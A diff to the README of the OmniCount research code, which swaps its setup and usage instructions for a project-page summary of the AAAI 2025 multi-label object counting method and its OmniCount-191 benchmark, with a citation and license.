@@ -25,43 +25,64 @@ omniCount/
 
 `scripts/project_wrappers/` contains OmniCount-specific launch wrappers layered over upstream repos.
 
-## Setup
+# OmniCount: Multi-label Object Counting with Semantic-Geometric Priors
 
-```bash
-#Clone the repo
-cd omnicount
-cd external/sam && pip install -e . && cd ../..
-cd external/GroundingDINO && pip install -e . && cd ../..
-cd external/SAN && pip install -r requirements.txt && cd ../..
-cd external/Marigold && pip install -r requirements.txt && cd ../..
+## [AAAI 2025](https://aaai.org/Conferences/AAAI-25/)
 
-bash scripts/download_checkpoints.sh ./checkpoints
+[Download](https://github.com/mondalanindya/OmniCount/raw/refs/heads/main/OmniCount-191.zip) | [Paper](https://ojs.aaai.org/index.php/AAAI/article/view/34151) | [Code](https://github.com/mondalanindya/OmniCount/)
+
+TL;DR: OmniCount introduces a training-free framework and the OmniCount-191 dataset for counting multiple object categories in a single pass using pre-trained semantic and geometric priors.
+
+## Object Counting Paradigms
+
+![OmniCount Teaser](https://raw.githubusercontent.com/mondalanindya/OmniCount/main/assets/figs/omnicount_teaser.png)
+
+Typical single-label object counting methods usually process one category at a time. OmniCount instead targets multi-label, open-vocabulary counting in a single pass.
+
+## Abstract
+
+OmniCount is a practical framework for simultaneous counting of multiple object categories without extra training. It combines semantic and geometric priors from pre-trained models, produces precise masks, and supports varied prompts through SAM to improve counting accuracy.
+
+## Video
+
+## OmniCount: Model Design
+
+![OmniCount Pipeline](https://raw.githubusercontent.com/mondalanindya/OmniCount/main/assets/figs/pipeline.png)
+
+OmniCount starts from an input image and target object classes, uses semantic and geometric estimation modules to generate class-specific masks and depth maps, refines these priors, and then passes patches and reference points into SAM for final counting.
+
+## Improving Counting using Priors
+
+![OmniCount Pipeline](https://raw.githubusercontent.com/mondalanindya/OmniCount/main/assets/figs/refinement.png)
+
+Reference point selection is improved by combining semantic priors, local maxima, and Gaussian refinement. Depth-guided recovery helps reduce over-segmentation and improves object recovery for occluded or distant instances.
+
+## Results
+
+Representative examples from the OmniCount-191 benchmark and related datasets show consistent multi-label counts across agriculture, birds, fruits, pets, urban scenes, and wildlife.
+
+## OmniCount-191 Benchmark
+
+![OmniCount-191 Benchmark](https://raw.githubusercontent.com/mondalanindya/OmniCount/main/assets/figs/omnicount191.png)
+
+OmniCount-191 is a benchmark for multi-label object counting with 30,230 images and annotations for point, box, and VQA-style supervision.
+
+## BibTeX
+
+```bibtex
+@inproceedings{mondal2025omnicount,
+	title={Omnicount: Multi-label object counting with semantic-geometric priors},
+	author={Mondal, Anindya and Nag, Sauradip and Zhu, Xiatian and Dutta, Anjan},
+	booktitle={Proceedings of the AAAI Conference on Artificial Intelligence},
+	volume={39},
+	number={18},
+	pages={19537--19545},
+	year={2025}
+}
 ```
 
-## Usage (Research Workflow)
+## License
 
-Run from repo root.
+Open RAIL-S License.
 
-```bash
-# 1) Depth maps
-python scripts/project_wrappers/marigold_run.py --input_rgb_dir outputs_sota/animals/images --output_dir outputs_sota/animals/depth
-python scripts/project_wrappers/marigold_run_mod.py --input_rgb_dir outputs_sota/animals/images --output_dir outputs_sota/animals/depth
-
-# 2) Binary masks
-bash scripts/project_wrappers/san_multi.sh
-
-# 3) Refinement and patches
-python preprocessing/extract_bin_mask.py
-python preprocessing/extract_zero.py
-python preprocessing/extract_patch.py
-
-# 4) Counting
-python core/sam_mod_multi.py
-python core/sam_mod_single.py
-python core/sam_mod_box_multi.py
-python core/sam_mod_box.py
-
-# 5) Evaluation
-python metrics/metric_multi.py
-python metrics/metric_single.py
-```
+Inspired by [Nerfies](https://nerfies.github.io/). Thanks to Manisha for UI/UX design insights.
